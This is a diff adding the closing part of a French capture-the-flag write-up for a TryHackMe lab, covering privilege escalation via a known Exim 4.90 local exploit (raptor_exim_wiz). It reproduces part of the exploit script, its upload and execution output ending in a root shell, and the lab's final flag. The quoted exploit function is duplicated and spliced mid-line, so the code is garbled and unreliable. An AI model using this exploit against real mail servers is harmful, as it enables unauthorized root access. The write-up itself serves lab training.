@@ -887,5 +887,193 @@ exim4 version est vulnerable à l'exploit [exploit](https://www.exploit-db.com/e
 gunter@at:~$ id
 uid=1007(gunter) gid=1007(gunter) groups=1007(gunter),1012(gcc)
 
+gunter@at:~$ cat /etc/exim4/update-exim4.conf.conf 
+# /etc/exim4/update-exim4.conf.conf
+#
+# Edit this file and /etc/mailname by hand and execute update-exim4.conf
+# yourself or use 'dpkg-reconfigure exim4-config'
+#
+# Please note that this is _not_ a dpkg-conffile and that automatic changes
+# to this file might happen. The code handling this will honor your local
+# changes, so this is usually fine, but will break local schemes that mess
+# around with multiple versions of the file.
+#
+# update-exim4.conf uses this file to determine variable values to generate
+# exim configuration macros for the configuration file.
+#
+# Most settings found in here do have corresponding questions in the
+# Debconf configuration, but not all of them.
+#
+# This is a Debian specific file
+
+dc_eximconfig_configtype='local'
+dc_other_hostnames='at'
+dc_local_interfaces='127.0.0.1.60000'
+dc_readhost=''
+dc_relay_domains=''
+dc_minimaldns='false'
+dc_relay_nets=''
+dc_smarthost=''
+CFILEMODE='644'
+dc_use_split_config='false'
+dc_hide_mailname=''
+dc_mailname_in_oh='true'
+dc_localdelivery='mail_spool'
 
 ```
+
+On voit deux conditions pour l'exploit fonctionne l'utilisateur apartient à gcc et on se connecte sur le port 60000 sur le localhost.    
+
+```bash
+tim@kali:~/Bureau/tryhackme/write-up$ cat exploit.sh 
+#!/bin/bash
+...
+# payload delivery
+function exploit()
+{
+	# connect to localhost:25
+	exec 3<>/dev/tcp/localhost/60000
+
+	# deliver the payload
+	read -u 3 && echo $REPLY
+	echo "helo localhost" >&3
+	read -u 3 && echo $REPLY
+	echo "mail from:<>" >&3
+	read -u 3 && echo $REPLY
+	echo "rcpt to:<$PAYLOAD>" >&3
+	read -u 3 && echo $REPLY
+	echo "data" >&3# payload delivery
+function exploit()
+{
+	# connect to localhost:25
+	exec 3<>/dev/tcp/localhost/60000
+
+	# deliver the payload
+	read -u 3 && echo $REPLY
+	echo "helo localhost" >&3
+	read -u 3 && echo $REPLY
+	echo "mail from:<>" >&3
+	read -u 3 && echo $REPLY
+	echo "rcpt to:<$PAYLOAD>" >&3
+	read -u 3 && echo $REPLY
+	echo "data" >&3
+	read -u 3 && echo $REPLY
+	for i in {1..31}
+	do
+		echo "Received: $i" >&3
+	done
+	echo "." >&3
+	read -u 3 && echo $REPLY
+	echo "quit" >&3
+	read -u 3 && echo $REPLY
+}
+
+
+	read -u 3 && echo $REPLY
+	for i in {1..31}
+	do
+		echo "Received: $i" >&3
+	done
+	echo "." >&3
+	read -u 3 && echo $REPLY
+	echo "quit" >&3
+	read -u 3 && echo $REPLY
+}
+...
+```
+
+On configure l'exploit.   
+
+```bash
+tim@kali:~/Bureau/tryhackme/write-up$ scp ./exploit.sh gunter@land-of-ooo.com:/tmp
+gunter@land-of-ooo.com's password: 
+exploit.sh                            
+...
+gunter@at:/tmp$ chmod +x exploit.sh 
+
+gunter@at:/tmp$ ./exploit.sh 
+
+raptor_exim_wiz - "The Return of the WIZard" LPE exploit
+Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>
+
+Preparing setuid shell helper...
+Problems compiling setuid shell helper, check your gcc.
+Falling back to the /bin/sh method.
+cp: cannot create regular file '/tmp/pwned': Permission denied
+
+Delivering setuid payload...
+220 at ESMTP Exim 4.90_1 Ubuntu Wed, 17 Nov 2021 10:59:58 +0100
+250 at Hello localhost [127.0.0.1]
+250 OK
+250 Accepted
+354 Enter message, ending with "." on a line by itself
+250 OK id=1mnHjS-00018s-Vr
+221 at closing connection
+
+Waiting 5 seconds...
+-rwxr-xr-x 1 root gunter 8504 nov 17 10:53 /tmp/pwned
+
+# id
+uid=0(root) gid=0(root) groups=0(root),1007(gunter),1012(gcc)
+# ls /home   	
+apple-guards  bubblegum  fern  finn  gunter  jake  marceline  peppermint-butler
+# cd /home/bubblegum
+# ls
+Desktop  Documents  Downloads  Music  nmap  Pictures  Public  Secrets  secretServer.py	Templates  Videos
+# cd Secrets
+# ls
+bmo.txt
+# cat bmo.txt
+
+
+
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+░░░░▄██████████████████████▄░░░░
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
+░░░░█░▄██████████████████▄░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░░░░█░█░░█░░░░░░░░░░░░█░░█░█░░░░
+░░░░█░█░░░░░▄▄▄▄▄▄▄▄░░░░░█░█░░░░
+░░░░█░█░░░░░▀▄░░░░▄▀░░░░░█░█░░░░
+░░░░█░█░░░░░░░▀▀▀▀░░░░░░░█░█░░░░
+░░░░█░█░░░░░░░░░░░░░░░░░░█░█░░░░
+░█▌░█░▀██████████████████▀░█░▐█░
+░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
+░█░░█░████████████░░░░░██░░█░░█░
+░█░░█░░░░░░░░░░░░░░░░░░░░░░█░░█░
+░█░░█░░░░░░░░░░░░░░░▄░░░░░░█░░█░
+░▀█▄█░░░▐█▌░░░░░░░▄███▄░██░█▄█▀░
+░░░▀█░░█████░░░░░░░░░░░░░░░█▀░░░
+░░░░█░░░▐█▌░░░░░░░░░▄██▄░░░█░░░░
+░░░░█░░░░░░░░░░░░░░▐████▌░░█░░░░
+░░░░█░▄▄▄░▄▄▄░░░░░░░▀██▀░░░█░░░░
+░░░░█░░░░░░░░░░░░░░░░░░░░░░█░░░░
+░░░░▀██████████████████████▀░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░░██░░░░░░░░░░░░██░░░░░░░░
+░░░░░░░▐██░░░░░░░░░░░░██▌░░░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+
+
+Secret project number: 211243A
+Name opbject: BMO
+Rol object: Spy
+
+In case of emergency use resetcode: tryhackme{Th1s1s4c0d3F0rBM0}
+
+
+-------
+
+Good job on getting this code!!!!
+You solved all the puzzles and tried harder to the max.
+If you liked this CTF, give a shout out to @n0w4n.
+
+```
+
+On rend l'exploit exécutable.   
+On lance l'exploit et on obtient un shell root.  
+Dans le répertoire /home/bubblegum/Secrets on trouve un fichier bmo.txt.  
+On lit le fichier bmo.txt qui contient le flag qui est : tryhackme{Th1s1s4c0d3F0rBM0}   
